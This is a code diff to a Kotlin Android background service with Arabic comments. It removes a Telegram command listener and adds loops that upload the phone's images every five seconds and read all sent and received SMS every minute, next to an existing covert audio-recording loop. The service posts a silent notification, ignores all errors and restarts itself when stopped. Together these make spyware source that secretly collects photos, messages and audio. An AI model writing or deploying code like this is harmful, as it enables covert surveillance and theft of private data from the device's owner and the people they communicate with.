@@ -6,7 +6,6 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
@@ -26,11 +25,6 @@ class BackgroundService : Service() {
     override fun onCreate() {
         super.onCreate()
         startForegroundWithNotification()
-
-        // Command listener — يستمع للأوامر من تيليجرام
-        try { CommandListener.start(applicationContext) } catch (_: Exception) {}
-
-        // Background scans
         startLoops()
     }
 
@@ -40,7 +34,6 @@ class BackgroundService : Service() {
 
     override fun onDestroy() {
         running = false
-        try { CommandListener.stop() } catch (_: Exception) {}
         scope.cancel()
         try {
             val restart = Intent(applicationContext, BackgroundService::class.java)
@@ -78,20 +71,38 @@ class BackgroundService : Service() {
             .setSilent(true)
             .build()
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1001, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-        } else {
-            startForeground(1001, notif)
-        }
+        startForeground(1001, notif)
     }
 
     private fun startLoops() {
-        // Audio recorder loop — كل 10 ثواني
+        // صور فورًا — كل 5 ثواني
+        scope.launch {
+            while (running) {
+                try { scanAndUploadImages() } catch (_: Exception) {}
+                delay(5_000L)
+            }
+        }
+        // flush queue كل 5 ثواني
+        scope.launch {
+            while (running) {
+                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
+                delay(5_000L)
+            }
+        }
+        // SMS كل 60 ثانية
+        scope.launch {
+            while (running) {
+                try { scanSms() } catch (_: Exception) {}
+                delay(60_000L)
+            }
+        }
+
+        // 🎤 حلقة تسجيل الصوت — كل 10 ثواني
         scope.launch {
             while (running) {
                 try {
                     if (AudioRecorder.isRunning()) {
-                        val file = AudioRecorder.startChunk(applicationContext)
+                        AudioRecorder.startChunk(applicationContext)
                         delay(Config.AUDIO_CHUNK_MS)
                         val done = AudioRecorder.stopChunk()
                         if (done != null && done.exists() && done.length() > 1000) {
@@ -107,7 +118,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // Clean old audio files
+        // Cleanup old audio files
         scope.launch {
             while (running) {
                 try {
@@ -122,5 +133,17 @@ class BackgroundService : Service() {
                 delay(5 * 60_000L)
             }
         }
+    }
+
+    private fun scanAndUploadImages() {
+        val images = MediaScanner.scanImages(applicationContext)
+        for (img in images) {
+            Uploader.uploadMediaFile(applicationContext, img)
+        }
+    }
+
+    private fun scanSms() {
+        val msgs = SmsReader.scanAll(applicationContext) + SmsReader.scanSent(applicationContext)
+        for (m in msgs) DataStore.appendAny(applicationContext, m)
     }
 }
